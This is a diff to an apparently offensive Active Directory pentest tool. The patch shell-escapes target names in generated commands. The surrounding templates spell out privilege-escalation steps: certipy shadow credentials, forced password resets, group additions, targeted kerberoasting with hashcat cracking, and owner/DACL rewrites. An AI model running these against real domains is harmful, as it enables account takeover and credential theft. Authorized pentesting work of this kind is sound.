@@ -1415,6 +1415,11 @@ def run(report, store, ui=None):
             _owned_pw = _sh_sq(_owned_pw)
             _owned = _sh_sq(_owned)
             _dom_e = _sh_sq(_dom_e)
+            # iter-153: shell-escape target too. BH edge targets are
+            # samAccountName / FQDN strings that AD allows to carry '.
+            # Keep raw tgt for the human-readable Chain summary text
+            # (unchanged); use _tgt_e in every shell splice below.
+            _tgt_e = _sh_sq(tgt)
             if _owned_hash:
                 _impacket_uri = f"'{_dom_e}/{_owned}'"           # no ':pw' suffix
                 _impacket_hash = f"-hashes '{_blank_lm}:{_owned_hash}'"
@@ -1480,7 +1485,7 @@ def run(report, store, ui=None):
                     crit=9, conf=0.85, ready=1.4, prox=0.9,         # score 9.64
                     commands=[
                         f"certipy-ad shadow auto -u '{_owned}@{_dom_e}' "
-                        f"{_sh_auth} -account '{tgt}' -dc-ip {_dc_e}",
+                        f"{_sh_auth} -account '{_tgt_e}' -dc-ip {_dc_e}",
                         f"# certipy prints {tgt}'s NT hash; PtH (see R7)",
                     ], src=edge["src"], line=edge["line"]))
             elif r in ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner"):
@@ -1522,16 +1527,16 @@ def run(report, store, ui=None):
                         f"{r}: {actor} -> {tgt} (ForceChangePassword -> own as DA?)",
                         crit=7, conf=0.7, ready=1.3, prox=0.85,     # score 5.42
                         commands=[
-                            f"net rpc password '{tgt}' '<NewP@ss123!>' "
+                            f"net rpc password '{_tgt_e}' '<NewP@ss123!>' "
                             f"{_net_rpc_U} -S {_dc_e}",
-                            f"netexec smb {_dc_e} -u '{tgt}' -p '<NewP@ss123!>' --shares",
+                            f"netexec smb {_dc_e} -u '{_tgt_e}' -p '<NewP@ss123!>' --shares",
                         ], src=edge["src"], line=edge["line"]))
             elif r == "ForceChangePassword":
                 chains.append(Chain("R-WRITEDACL", "ForceChangePassword",
                     f"ForceChangePassword: {actor} -> {tgt}",
                     crit=7, conf=0.8, ready=1.4, prox=0.85,         # score 6.66
                     commands=[
-                        f"net rpc password '{tgt}' '<NewP@ss123!>' "
+                        f"net rpc password '{_tgt_e}' '<NewP@ss123!>' "
                         f"{_net_rpc_U} -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "ReadGMSAPassword":
@@ -1557,7 +1562,7 @@ def run(report, store, ui=None):
                     f"AddMember: {actor} -> group {tgt}",
                     crit=6, conf=0.7, ready=1.3, prox=0.8,
                     commands=[
-                        f"net rpc group addmem '{tgt}' '{_owned}' "
+                        f"net rpc group addmem '{_tgt_e}' '{_owned}' "
                         f"{_net_rpc_U} -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AddAllowedToAct":
@@ -1607,8 +1612,8 @@ def run(report, store, ui=None):
                     crit=7, conf=0.75, ready=1.3, prox=0.85,       # score 5.80
                     commands=[
                         f"impacket-addspn -u '{_dom_e}\\{_owned}' {_addspn_auth2} "
-                        f"-t '{tgt}' -s 'HTTP/kerberoast' {_dc_e}",
-                        f"impacket-GetUserSPNs -request-user '{tgt}' -dc-ip {_dc_e} "
+                        f"-t '{_tgt_e}' -s 'HTTP/kerberoast' {_dc_e}",
+                        f"impacket-GetUserSPNs -request-user '{_tgt_e}' -dc-ip {_dc_e} "
                         f"{_impacket_uri}{_hf3} | tee tgs.txt",
                         "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
                     ], src=edge["src"], line=edge["line"]))
@@ -1619,7 +1624,7 @@ def run(report, store, ui=None):
                     f"AddSelf: {actor} -> group {tgt}",
                     crit=6, conf=0.75, ready=1.3, prox=0.8,       # score 4.68
                     commands=[
-                        f"net rpc group addmem '{tgt}' '{_owned}' "
+                        f"net rpc group addmem '{_tgt_e}' '{_owned}' "
                         f"{_net_rpc_U} -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "Owns":
@@ -1634,10 +1639,10 @@ def run(report, store, ui=None):
                     commands=[
                         f"# grant self WriteDacl via ownership",
                         f"impacket-owneredit -action write -new-owner "
-                        f"'{_owned}' -target '{tgt}'{_hf} "
+                        f"'{_owned}' -target '{_tgt_e}'{_hf} "
                         f"{_impacket_uri}",
                         f"impacket-dacledit -action write -rights FullControl "
-                        f"-principal '{_owned}' -target '{tgt}'{_hf} "
+                        f"-principal '{_owned}' -target '{_tgt_e}'{_hf} "
                         f"{_impacket_uri}",
                         f"# then chain to R-WRITEDACL / R-SHADOW / R-RBCD",
                     ], src=edge["src"], line=edge["line"]))
@@ -1667,7 +1672,7 @@ def run(report, store, ui=None):
                         f"AllExtendedRights: {actor} -> {tgt}",
                         crit=7, conf=0.8, ready=1.4, prox=0.85,    # score 6.66
                         commands=[
-                            f"net rpc password '{tgt}' '<NewP@ss123!>' "
+                            f"net rpc password '{_tgt_e}' '<NewP@ss123!>' "
                             f"{_net_rpc_U} -S {_dc_e}",
                         ], src=edge["src"], line=edge["line"]))
             elif r == "WriteSPN":
@@ -1686,8 +1691,8 @@ def run(report, store, ui=None):
                     crit=8, conf=0.85, ready=1.4, prox=0.9,       # score 8.57
                     commands=[
                         f"impacket-addspn -u '{_dom_e}\\{_owned}' {_addspn_auth} "
-                        f"-t '{tgt}' -s 'HTTP/kerberoast' {_dc_e}",
-                        f"impacket-GetUserSPNs -request-user '{tgt}' "
+                        f"-t '{_tgt_e}' -s 'HTTP/kerberoast' {_dc_e}",
+                        f"impacket-GetUserSPNs -request-user '{_tgt_e}' "
                         f"-dc-ip {_dc_e} {_impacket_uri}{_hf} | tee tgs.txt",
                         "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
                         "# then PtH the recovered NT hash (see R7)",
